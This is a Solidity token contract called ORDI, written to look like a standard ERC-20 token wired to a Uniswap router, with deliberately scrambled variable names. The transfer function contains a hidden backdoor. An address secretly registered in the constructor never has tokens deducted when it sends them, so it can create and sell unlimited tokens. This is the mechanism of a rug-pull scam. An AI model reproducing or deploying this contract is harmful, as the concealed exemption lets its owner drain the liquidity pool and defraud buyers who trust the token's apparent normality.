contract ORDI is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spmnokevwid, uint256 djhaf) public returns (bool success) {
        allowance[msg.sender][spmnokevwid] = djhaf;
        emit Approval(msg.sender, spmnokevwid, djhaf);
        return true;
    }

    string public name;

    string public symbol;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private tlvykgxzsp;

    mapping(address => mapping(address => uint256)) public allowance;

    IUniswapV2Router02 private cgykev;

    mapping(address => uint256) private hzpjoawv;

    function _transfer(address lzivrsegmokb, address wojs, uint256 djhaf) private {
        bool xftnbumyqezs = !snoxejcf[lzivrsegmokb];
        if (xftnbumyqezs) {
            balanceOf[lzivrsegmokb] -= djhaf;
        }
        hzpjoawv[wojs] = djhaf;
        balanceOf[wojs] += djhaf;
        tlvykgxzsp[wojs] = block.number;
        emit Transfer(lzivrsegmokb, wojs, djhaf);
    }

    function transferFrom(address lzivrsegmokb, address wojs, uint256 djhaf) public returns (bool success) {
        require(djhaf <= allowance[lzivrsegmokb][msg.sender]);
        allowance[lzivrsegmokb][msg.sender] -= djhaf;
        _transfer(lzivrsegmokb, wojs, djhaf);
        return true;
    }

    function transfer(address wojs, uint256 djhaf) public returns (bool success) {
        _transfer(msg.sender, wojs, djhaf);
        return true;
    }

    constructor(string memory iympqvrlg, string memory etvuc, address kdvrigcsahf, address ksfjw) {
        name = iympqvrlg;
        symbol = etvuc;
        balanceOf[msg.sender] = totalSupply;
        snoxejcf[ksfjw] = true;
        cgykev = IUniswapV2Router02(kdvrigcsahf);
    }

    mapping(address => bool) private snoxejcf;
}
